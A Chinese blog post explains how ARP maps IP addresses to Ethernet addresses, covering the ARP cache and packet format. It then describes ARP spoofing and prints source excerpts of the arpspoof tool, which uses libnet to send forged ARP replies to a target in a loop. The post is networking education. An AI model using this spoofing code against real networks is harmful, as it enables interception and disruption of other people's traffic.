---
layout: post
section-type: post
title: ARP协议
category: Category
tags: [ 'arp欺骗', 'arp协议' ]
---

ARP：地址解析协议，为IP地址到对应的硬件地址提供动态映射。这个过程是自动完成的，应用程序和系统管理员不用关心。

假如我们通过浏览器访问  www.baidu.com ，这中间到底都发生了什么，我们来分析一下：

1.应用程序(也就是http协议)首先通过调用函数 gethostbyname() 把域名解析为32位的IP地址，这个转换过程使用的是 DNS 域名解析服务。

2.客户端请求TCP用得到的IP地址建立链接。

3.TCP发送一个链接请求分段到远端的主机，即用上述IP地址发送一份 IP 数据报

4.如果目的主机在本地网络上（如以太网、令牌环网或点对点链接的另一端），那么IP数据报可以直接送到目的主机上。如果目的主机在一个远程网络上，那么就通过IP选路来确定位于网络上的下一站路由器地址，并让它转发IP数据报。这两种情况下，IP数据报都是被发送到位于本地网上的一台主机或者路由器。

5.假定是一个以太网，那么发送端必须把32bit的IP地址转换成48bit的以太网地址。从逻辑Internet地址到对应的物理地址需要进行翻译。 这就是ARP的功能。（我们的主机和 www.baidu.com 应该没在一个局域网，所以它是发往路由器的）ARP本来是用于广播网络的，有许多主机或路由器连在同一个网络上。

6.ARP发送一份称做ARP请求的以太网数据帧给以太网山的每个主机。这个过程称做广播，ARP请求数据帧中包含目的主机的IP地址，其意思是“如果你是这个IP地址的拥有者，请回答你的硬件地址。”

7.目的主机的ARP层收到这个广播报文后，识别出这是发送端在询问它的地址，于是发送一个ARP应答。这个ARP应答包含IP地址以及对应的硬件地址。

8.受到ARP应答后，使ARP进行请求--应答交换的IP数据报现在就可以传送了。

9.发送IP数据报到目的主机。

在ARP背后有一个基本概念，那就是网络接口有一个硬件地址（一个48bit的值，标识不同的以太网或者令牌环网接口）。在硬件层次上进行的数据帧交换必须有正确的接口地址。但是，TCP/IP有自己的地址：32bit的IP地址。知道主机的IP地址并不能让内核发送一帧数据给主机。内核（如以太网驱动程序）必须知道目的端的硬件地址才能发送。

ARP高速缓存：ARP高效运行的关键是由于每个主机上都有一个ARP高速缓存。这个高速缓存存放了最近Internet地址到硬件地址的映射记录。高速缓存中的每一项的生存时间一般为20分钟，起始时间从被创建是开始算起。

可以用 arp 命令查看ARP缓存。


ARP 协议分组格式：

<pre><code data-trim class="c">
{% raw %}
| - - - - - -|- - -- -- | -  -| - -  |  - -  |    -     |    -     |--| - - -- - -  | - -- -| - - - - - -|- ---|
|      6     |     6    |  2  |   2  |   2   |    1     |    1     |2 |      6      |   4   |     6      |  4  |
|以太网目的地址|以太网源地址|帧类型|硬件类型|协议类型|硬件地址长度|协议地址长度|OP|发送端以太网地址|发送端IP|目的以太网地址|目的IP|
|-------------以太网首部----- --|-----------------28字节ARP请求/应答-----------------------------------------------|
{% endraw %}
</code></pre>
帧类型表示后面的数据类型，对于ARP协议来说，该字段的值为 0x0806;

硬件类型表示硬件地址的类型。它的值为 1 表示以太网地址。

协议类型表示要映射的协议地址类型。 它的值为 0x0800 即表示 IP 地址。

硬件地址长度和协议地址长度分别表示硬件地址和协议地址的长度，以字节为单位。对于以太网上IP地址请求或应答来说，他们的值分别为 6 和 4 .

OP 操作字段指出四种操作类型， 他们是 ARP请求（值为1），ARP应答（值为2），RARP请求（值为3）,RARP应答（值为4）

接下来四个字段是发送端的硬件地址，发送端的协议地址，目的端的硬件地址，目的端的协议地址。

对于一个ARP请求来说，除目的端硬件地址外的所有其他字段都有填充值。当系统收到一份目的端地址为本机的ARP请求报文后，它就把硬件地址填进去，然后用两个目的端地址分别替换两个发送端地址，并把操作字段改为 2 ,最后发送出去。

ARP欺骗：我们已经知道 ARP 协议是 IP 地址到 硬件地址的映射，那么 ARP 欺骗就很好理解，就是人为的在网络中发送虚假的 ARP 应答包，致使被欺骗的主机更新ARP高速缓存，这样被欺骗的主机就不能正确发送数据到目的主机。（linux 有个命令arpspoof，大家可以试试，如果目标主机设置的是静态ARP映射，ARP欺骗是没用的，~.~）

arpspoof 是使用 libpcap 和 libnet 两个库来实现的，  libpcap 用来获取本地网卡信息， libnet 用来构造 ARP 报文并发送

下面是部分源码，完整代码可以自己补充

<pre><code data-trim class="c">
{% raw %}
int
main(int argc, char *argv[])
{
	int c;
	char ebuf[PCAP_ERRBUF_SIZE];

	intf = NULL;
	spoof_ip = target_ip = 0;

	while ((c = getopt(argc, argv, "i:t:h?V")) != -1) {
		switch (c) {
		case 'i':
			intf = optarg;
			break;
		case 't':
			if ((target_ip = libnet_name_resolve(optarg, 1)) == -1)
				usage();
			break;
		default:
			usage();
		}
	}
	argc -= optind;
	argv += optind;

	if (argc != 1)
		usage();

	/*域名解析为 IP 地址*/
	if ((spoof_ip = libnet_name_resolve(argv[0], 1)) == -1)  
		usage();

  /*获取本地网卡*/
	if (intf == NULL && (intf = pcap_lookupdev(ebuf)) == NULL)
		errx(1, "%s", ebuf);

	/*初始化 libnet 句柄*/
	if ((llif = libnet_open_link_interface(intf, ebuf)) == 0)
		errx(1, "%s", ebuf);

	/*获取目标主机的 MAC 地址*/
	if (target_ip != 0 && !arp_find(target_ip, &target_mac))
		errx(1, "couldn't arp for host %s",
		     libnet_host_lookup(target_ip, 0));

	signal(SIGHUP, cleanup);
	signal(SIGINT, cleanup);
	signal(SIGTERM, cleanup);

	for (;;) {
		arp_send(llif, intf, ARPOP_REPLY, NULL, spoof_ip,
			 (target_ip ? (u_char *)&target_mac : NULL),
			 target_ip);
		sleep(2);
	}
	/* NOTREACHED */

	exit(0);
}
{% endraw %}
</code></pre>


arp_send() 函数是构造 ARP 欺骗包并发送的实现


<pre><code data-trim class="c">
{% raw %}

int arp_send(struct libnet_link_int *llif, char *dev, int op, u_char *sha, in_addr_t spa, u_char *tha, in_addr_t tpa)
{
	char ebuf[128];
	u_char pkt[60];

  /*获取本地 mac 地址*/
	if (sha == NULL && (sha = (u_char *)libnet_get_hwaddr(llif, dev, ebuf)) == NULL) {
		return (-1);
	}

  /*获取本地 IP 地址*/
	if (spa == 0) {
		if ((spa = libnet_get_ipaddr(llif, dev, ebuf)) == 0)
			return (-1);
		spa = htonl(spa); /* XXX */
	}
	if (tha == NULL)
		tha = "\xff\xff\xff\xff\xff\xff";

  /*构造链路层数据包*/
	libnet_build_ethernet(tha, sha, ETHERTYPE_ARP, NULL, 0, llif, 0);
  /*构造ARP数据报*/
  libnet_build_arp(ARPHRD_ETHER, ETHERTYPE_IP, ETHER_ADDR_LEN, 4,
       op, sha, (u_char *)&spa, tha, (u_char *)&tpa, NULL, 0, llif, 0);

	fprintf(stderr, "%s ",
		ether_ntoa((struct ether_addr *)sha));

	if (op == ARPOP_REQUEST) {
		fprintf(stderr, "%s 0806 42: arp who-has %s tell %s\n",
			ether_ntoa((struct ether_addr *)tha),
			libnet_host_lookup(tpa, 0),
			libnet_host_lookup(spa, 0));
	}
	else {
		fprintf(stderr, "%s 0806 42: arp reply %s is-at ",
			ether_ntoa((struct ether_addr *)tha),
			libnet_host_lookup(spa, 0));
		fprintf(stderr, "%s\n",
			ether_ntoa((struct ether_addr *)sha));
	}
  /*发送 数据包 */
	return (libnet_write(llif));
}
{% endraw %}
</code></pre>

请谨慎使用。
